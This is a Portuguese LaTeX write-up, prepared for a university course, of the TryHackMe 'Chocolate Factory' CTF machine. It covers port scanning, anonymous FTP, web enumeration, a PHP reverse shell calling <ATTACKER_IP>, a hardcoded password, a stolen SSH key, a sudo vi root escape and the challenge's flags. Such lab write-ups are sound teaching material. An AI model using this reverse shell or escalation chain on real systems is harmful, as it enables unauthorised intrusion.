@@ -1,0 +1,402 @@
+%==============================================================================
+% Write-Up de CTF - Chocolate Factory (TryHackMe)
+% Materia : CIC0087 - Topicos Avancados em Computadores - Turma 04 - 2026/2
+% Depto.  : Departamento de Ciencias da Computacao
+% Baseado na "Metodologia para Construcao de Write-Ups em CTF"
+%
+% Compilacao:  pdflatex main.tex   (rodar 2x para atualizar o Sumario)
+%==============================================================================
+\documentclass[12pt,a4paper]{article}
+
+%------------------------- Codificacao e idioma -------------------------------
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage[brazil]{babel}
+
+%------------------------- Fonte Times New Roman ------------------------------
+\usepackage{newtxtext}   % corpo em Times
+\usepackage{newtxmath}   % matematica em Times
+
+%------------------------- Margens (minimo 2 cm) ------------------------------
+\usepackage[a4paper,margin=2cm,headheight=15pt,includehead,includefoot]{geometry}
+
+%------------------------- Utilitarios ----------------------------------------
+\usepackage{graphicx}
+\graphicspath{{img/}{./img/}}
+\usepackage{xcolor}
+\usepackage{float}
+\usepackage[hidelinks]{hyperref}
+\usepackage{fancyhdr}
+\usepackage{listings}
+\usepackage[most]{tcolorbox}
+\usepackage{caption}
+\usepackage{enumitem}
+\usepackage{setspace}
+
+\hypersetup{
+  colorlinks=true,
+  linkcolor=black,
+  urlcolor=blue!60!black,
+  citecolor=black
+}
+\onehalfspacing
+
+%============================= METADADOS =======================================
+\newcommand{\desafioNome}{Chocolate Factory}
+\newcommand{\plataforma}{TryHackMe}
+\newcommand{\dificuldade}{Fácil}
+\newcommand{\dataResolucao}{03/10/2026}
+\newcommand{\autorNome}{Luís Eduardo Curi Serra}
+
+% Dados academicos (fixos para a disciplina)
+\newcommand{\materia}{CIC0087 -- Tópicos Avançados em Computadores -- Turma 04 -- 2026/2}
+\newcommand{\departamento}{Departamento de Ciências da Computação}
+\newcommand{\matricula}{251033574}
+\newcommand{\professor}{Roberto Rodrigues Filho}
+\newcommand{\universidade}{Universidade de Brasília}
+%===============================================================================
+
+%------------------------- Cabecalho e rodape ---------------------------------
+\pagestyle{fancy}
+\fancyhf{}
+\lhead{\small\itshape \desafioNome}
+\rhead{\small\itshape \autorNome}
+\lfoot{\small \materia}
+\rfoot{\small Página \thepage}
+\renewcommand{\headrulewidth}{0.4pt}
+\renewcommand{\footrulewidth}{0.4pt}
+
+%------------------------- Estilo dos blocos de codigo ------------------------
+\definecolor{codebg}{gray}{0.95}
+\definecolor{codeframe}{gray}{0.75}
+\definecolor{cmt}{RGB}{100,120,100}
+\definecolor{kw}{RGB}{0,0,150}
+\definecolor{str}{RGB}{150,50,50}
+
+\lstdefinestyle{shell}{
+  backgroundcolor=\color{codebg},
+  basicstyle=\ttfamily\small,
+  keywordstyle=\color{kw}\bfseries,
+  commentstyle=\color{cmt}\itshape,
+  stringstyle=\color{str},
+  frame=single,
+  rulecolor=\color{codeframe},
+  breaklines=true,
+  breakatwhitespace=false,
+  postbreak=\mbox{\textcolor{codeframe}{$\hookrightarrow$}\space},
+  columns=fullflexible,
+  keepspaces=true,
+  showstringspaces=false,
+  tabsize=2,
+  captionpos=b,
+  xleftmargin=0.4em,
+  xrightmargin=0.4em,
+  aboveskip=1em,
+  belowskip=1em,
+}
+\lstset{style=shell}
+
+% Atalho: comando de terminal em linha
+\newcommand{\cmd}[1]{\lstinline[style=shell]|#1|}
+
+% Ambiente para OUTPUT (fundo levemente diferente, fonte menor)
+\lstdefinestyle{output}{
+  style=shell,
+  backgroundcolor=\color{gray!8},
+  basicstyle=\ttfamily\footnotesize,
+  keywordstyle=\ttfamily,
+}
+
+%------------ Caixa de "becos sem saida" (tentativas sem sucesso) --------------
+\definecolor{deadendbg}{RGB}{255,248,240}
+\definecolor{deadendframe}{RGB}{193,108,44}
+\newtcolorbox{becosemsaida}[1][Tentativas sem sucesso (becos sem saída)]{%
+  enhanced, breakable,
+  colback=deadendbg, colframe=deadendframe,
+  colbacktitle=deadendframe, coltitle=white,
+  boxrule=0.6pt, arc=2pt,
+  left=8pt, right=8pt, top=6pt, bottom=6pt,
+  fonttitle=\bfseries\small,
+  title={#1}%
+}
+
+%===============================================================================
+\begin{document}
+
+%============================= 2.1 CAPA =========================================
+\begin{titlepage}
+  \thispagestyle{empty}
+  \centering
+  {\scshape \universidade \par}
+  {\scshape \departamento \par}
+  \vspace{0.4cm}
+  {\small \materia \par}
+  \vspace{2.5cm}
+
+  \rule{\linewidth}{0.4pt}\par
+  \vspace{0.6cm}
+  {\huge \bfseries Write-Up: \desafioNome \par}
+  \vspace{0.4cm}
+  {\large Segurança Ofensiva --- Capture The Flag \par}
+  \vspace{0.6cm}
+  \rule{\linewidth}{0.4pt}\par
+
+  \vspace{2.0cm}
+  \begin{tabular}{rl}
+    \textbf{Plataforma:}       & \plataforma       \\[4pt]
+    \textbf{Dificuldade:}      & \dificuldade      \\[4pt]
+    \textbf{Data de resolução:}& \dataResolucao    \\
+  \end{tabular}
+
+  \vfill
+
+  \begin{tabular}{rl}
+    \textbf{Autor:}     & \autorNome  \\[4pt]
+    \textbf{Matrícula:} & \matricula  \\[4pt]
+    \textbf{Professor:} & \professor  \\
+  \end{tabular}
+
+  \vspace{1.2cm}
+  {\small \today \par}
+\end{titlepage}
+
+%============================= 2.2 SUMARIO ======================================
+\newpage
+\tableofcontents
+\thispagestyle{fancy}
+\newpage
+
+%============================= 2.3 VISAO GERAL ==================================
+\section{Visão Geral}
+\textbf{Chocolate Factory} é uma máquina Linux de dificuldade \emph{fácil} com
+temática do filme \emph{A Fantástica Fábrica de Chocolate}. A varredura revela
+\textbf{11 portas abertas}, mas a maioria é \emph{isca}: diversos serviços
+(portas 100, 106, 109, 110, 119, 125) respondem sempre com o mesmo \emph{banner}
+``\emph{chocolate room}'' mandando ``\emph{procurar em outro lugar}''. O caminho
+real combina \textbf{FTP anônimo}, \textbf{enumeração web} e \textbf{reutilização
+de credenciais}. A enumeração com Gobuster expõe \emph{directory listing}, que
+revela um binário ELF (\texttt{key\_rev\_key}) contendo uma chave, o
+\texttt{validate.php} com as credenciais de \texttt{charlie} em texto puro e um
+\emph{command panel} (\texttt{home.php}) usado para obter um \emph{reverse
+shell}. As credenciais de \texttt{charlie} e uma \textbf{chave SSH privada}
+deixada no \emph{home} dão acesso interativo e a \emph{flag} de usuário. A
+escalada se dá por uma política de \texttt{sudo} perigosa (\texttt{charlie} pode
+executar \texttt{/usr/bin/vi}), que permite \emph{shell escape} para
+\texttt{root}. A \emph{flag} final não está em texto: um script Python
+(\texttt{root.py}) a descriptografa via \emph{Fernet}, usando exatamente a chave
+encontrada no binário do início.
+
+%============================= 2.4 RECONHECIMENTO ===============================
+\section{Reconhecimento}
+
+\subsection{Varredura de portas}
+\begin{lstlisting}[language=bash,caption={Varredura de portas e serviços com Nmap.}]
+nmap -T4 <TARGET_IP>
+\end{lstlisting}
+
+A varredura retorna \textbf{11 portas abertas}. Na prática, apenas três
+importam --- \textbf{21/FTP}, \textbf{22/SSH} e \textbf{80/HTTP}; as demais são
+iscas (ver seção de becos sem saída).
+
+\begin{lstlisting}[style=output,caption={Portas abertas retornadas pela varredura.}]
+PORT    STATE SERVICE
+21/tcp  open  ftp
+22/tcp  open  ssh
+80/tcp  open  http
+100/tcp open  newacct
+106/tcp open  pop3pw
+109/tcp open  pop2
+110/tcp open  pop3
+111/tcp open  rpcbind
+113/tcp open  ident
+119/tcp open  nntp
+125/tcp open  locus-map
+\end{lstlisting}
+
+\subsection{FTP anônimo}
+O FTP aceita \emph{login} \texttt{anonymous} (senha vazia). Baixam-se todos os
+arquivos de uma vez desativando a confirmação interativa.
+
+\begin{lstlisting}[language=bash,caption={Login anônimo e download em massa no FTP.}]
+ftp <TARGET_IP> 21
+# Name: anonymous   (senha vazia, apenas Enter)
+ftp> prompt off          # desativa confirmacao do mget
+ftp> mget *              # baixa tudo -> gum_room.jpg
+\end{lstlisting}
+
+O único arquivo é \texttt{gum\_room.jpg}, que \textbf{não contém informação
+útil} para o progresso.
+
+\subsection{Enumeração web}
+A porta 80 serve uma página de \emph{login} (\texttt{index.html}). A enumeração
+de diretórios/arquivos com Gobuster (incluindo extensões) encontra o
+\texttt{home.php}.
+
+\begin{lstlisting}[language=bash,caption={Enumeração com Gobuster.}]
+gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
+\end{lstlisting}
+
+\begin{lstlisting}[style=output,caption={Achados relevantes do Gobuster.}]
+home.php    (Status: 200) [Size: 569]
+index.html  (Status: 200) [Size: 1466]
+\end{lstlisting}
+
+Com \emph{directory listing} habilitado, o servidor expõe a lista completa de
+arquivos da aplicação:
+
+\begin{lstlisting}[style=output,caption={Arquivos expostos pelo directory listing.}]
+home.jpg  home.php  image.png  index.html  index.php.bak  key_rev_key  validate.php
+\end{lstlisting}
+
+%============================= 2.5 EXPLORACAO ===================================
+\section{Exploração}
+
+\subsection{Extração da chave do binário ELF}
+O arquivo \texttt{key\_rev\_key} é um executável \textbf{ELF}. Inspecionando seu
+conteúdo (o ideal é \cmd{strings key_rev_key}), encontra-se uma chave embutida
+--- que só fará sentido no final, na etapa de \texttt{root}.
+
+\begin{lstlisting}[style=output,caption={Chave embutida no binário key\_rev\_key.}]
+congratulations you have found the key:
+-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=
+\end{lstlisting}
+
+\subsection{Reverse shell e coleta de credenciais}
+A página \texttt{home.php} contém um ponto de \textbf{execução de comandos}: o
+texto enviado é executado no servidor. Abre-se um \emph{listener} Netcat na
+máquina atacante e, pelo campo de comando do \texttt{home.php}, dispara-se um
+\emph{reverse shell} em PHP, obtendo \emph{shell} como \texttt{www-data}.
+
+\begin{lstlisting}[language=bash,caption={Listener Netcat na maquina atacante.}]
+nc -l -v -n -p 1234
+\end{lstlisting}
+
+\begin{lstlisting}[language=bash,caption={Comando executado no home.php (reverse shell PHP).}]
+php -r '$sock=fsockopen("<ATTACKER_IP>",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+\end{lstlisting}
+
+Já no \emph{shell}, a leitura de \texttt{validate.php} expõe as credenciais em
+\textbf{texto puro}:
+
+\begin{lstlisting}[style=output,caption={validate.php com credenciais hardcoded.}]
+if($uname=="charlie" && $password=="cn7824"){
+    echo "<script>window.location='home.php'</script>";
+}
+\end{lstlisting}
+
+\begin{center}
+\fbox{\texttt{charlie : cn7824}}
+\end{center}
+
+\subsection{Acesso via SSH e flag de usuário}
+No \emph{home} de \texttt{charlie} há um par de chaves SSH (\texttt{teleport} e
+\texttt{teleport.pub}). Copia-se a chave privada para a máquina atacante, ajusta-se
+a permissão e autentica-se via SSH --- sem necessidade de senha.
+
+\begin{lstlisting}[language=bash,caption={Acesso via chave SSH privada e leitura da flag de usuário.}]
+# chave privada 'teleport' salva localmente como id_rsa
+chmod 600 id_rsa
+ssh -i id_rsa charlie@<TARGET_IP>
+
+cat /home/charlie/user.txt
+# flag{cd5509042371b34e4826e4838b522d2e}
+\end{lstlisting}
+
+%======================== 2.6 ESCALADA DE PRIVILEGIOS ==========================
+\section{Escalada de Privilégios}
+
+\subsection{Enumeração local}
+\begin{lstlisting}[style=output,caption={Politica de sudo de charlie.}]
+User charlie may run the following commands on ip-<HOST>:
+    (ALL : !root) NOPASSWD: /usr/bin/vi
+\end{lstlisting}
+
+\texttt{charlie} pode executar \texttt{/usr/bin/vi} via \texttt{sudo} sem senha
+--- um \emph{shell escape} clássico (GTFOBins).
+
+\subsection{Shell escape via vi}
+\begin{lstlisting}[language=bash,caption={Escalada a root pelo vi.}]
+sudo vi
+# dentro do vi: tecla ESC, depois digitar  :shell  e Enter
+# -> shell como root
+\end{lstlisting}
+
+\subsection{Flag de root: decriptação Fernet}
+Em \texttt{/root} não há \texttt{root.txt}, e sim um script \texttt{root.py} que
+descriptografa a \emph{flag} com \emph{Fernet}, exigindo a chave obtida no
+binário do início (\texttt{-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=}). O
+script, como estava, não roda --- foi necessário corrigi-lo em dois pontos (ver
+becos sem saída). A versão final:
+
+\begin{lstlisting}[language=Python,caption={root.py corrigido (mensagem como bytes e displays comentados).}]
+from cryptography.fernet import Fernet
+key = input("Enter the key:  ")
+f = Fernet(key)
+encrypted_mess = b'gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ'
+dcrypt_mess = f.decrypt(encrypted_mess)
+print(dcrypt_mess.decode())
+\end{lstlisting}
+
+\begin{lstlisting}[style=output,caption={Execução final: flag de root.}]
+# python3 root.py
+Enter the key:  -VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=
+flag{cec59161d338fef787fcb4e296b42124}
+\end{lstlisting}
+
+%==================== 2.7 DEAD-ENDS / PERDAS DE TEMPO ==========================
+\section{Becos sem Saída e Perdas de Tempo}
+Esta seção consolida, de forma breve, todos os pontos em que a análise travou ou
+consumiu tempo sem retorno.
+
+\begin{becosemsaida}
+\begin{itemize}[leftmargin=1.4em,itemsep=4pt,topsep=2pt]
+  \item \textbf{Portas-isca (maior perda de tempo).} Das 11 portas abertas, seis
+        (\texttt{100/newacct}, \texttt{106/pop3pw}, \texttt{109/pop2},
+        \texttt{110/pop3}, \texttt{119/nntp}, \texttt{125/locus-map}) são falsos
+        serviços: ao conectar com \cmd{nc} ou enviar comandos de protocolo (ex.:
+        \cmd{echo "NEWACCT luisserra" | nc <IP> 100}), todas devolvem o
+        \emph{mesmo banner} ``\emph{Welcome to chocolate room!! [...] Look
+        somewhere else, its not here! ;)}''. Tempo gasto testando cada porta
+        individualmente antes de concluir que eram distração.
+  \item \textbf{\texttt{gum\_room.jpg} (FTP).} A imagem baixada do FTP não levou a
+        nada --- típico chamariz para \emph{esteganografia}. Inspecioná-la foi
+        esforço sem retorno para esta trilha de solução.
+  \item \textbf{\texttt{cat} em binário ELF.} A chave foi buscada com \cmd{cat
+        key_rev_key}, poluindo o terminal com bytes binários; \cmd{strings
+        key_rev_key} teria isolado a chave de imediato.
+  \item \textbf{\texttt{root.py} --- erro 1 (\emph{token must be bytes}).} A
+        \texttt{encrypted\_mess} estava como \emph{string}; o Fernet exige
+        \emph{bytes}. Correção: prefixar o literal com \texttt{b'...'}.
+  \item \textbf{\texttt{root.py} --- erro 2 (\emph{pyfiglet has no attribute
+        figlet\_format}).} A versão do \texttt{pyfiglet} no alvo não expõe
+        \texttt{figlet\_format}. Correção: comentar as linhas de \emph{display}
+        decorativo (\texttt{pyfiglet}), que são irrelevantes para a \emph{flag}.
+\end{itemize}
+\end{becosemsaida}
+
+%============================= 2.8 CONCLUSAO ====================================
+\section{Conclusão}
+O comprometimento encadeou várias más configurações: \textbf{FTP anônimo},
+\textbf{directory listing} expondo o código-fonte e um binário com chave
+embutida, \textbf{credenciais \emph{hardcoded}} em \texttt{validate.php}, uma
+\textbf{chave SSH privada} deixada no \emph{home} do usuário e, por fim, uma
+\textbf{política de \texttt{sudo}} que permitia \emph{shell escape} via
+\texttt{vi}. O principal obstáculo \emph{não técnico} foram as \textbf{portas-isca}:
+reconhecer cedo que os serviços da família POP/NNTP eram falsos
+(banner idêntico ``\emph{look somewhere else}'') teria economizado tempo
+considerável. As duas \emph{flags} obtidas foram
+\texttt{flag\{cd5509042371b34e4826e4838b522d2e\}} (usuário) e
+\texttt{flag\{cec59161d338fef787fcb4e296b42124\}} (root).
+
+%============================= 2.9 REFERENCIAS =================================
+\section{Referências}
+\begin{itemize}[leftmargin=1.5em]
+  \item TryHackMe --- Sala \emph{Chocolate Factory} ---
+        \url{https://tryhackme.com/room/chocolatefactory}
+  \item GTFOBins --- \texttt{vi} ---
+        \url{https://gtfobins.github.io/gtfobins/vi/}
+  \item \emph{cryptography} (Fernet) ---
+        \url{https://cryptography.io/en/latest/fernet/}
+\end{itemize}
+
+\end{document}
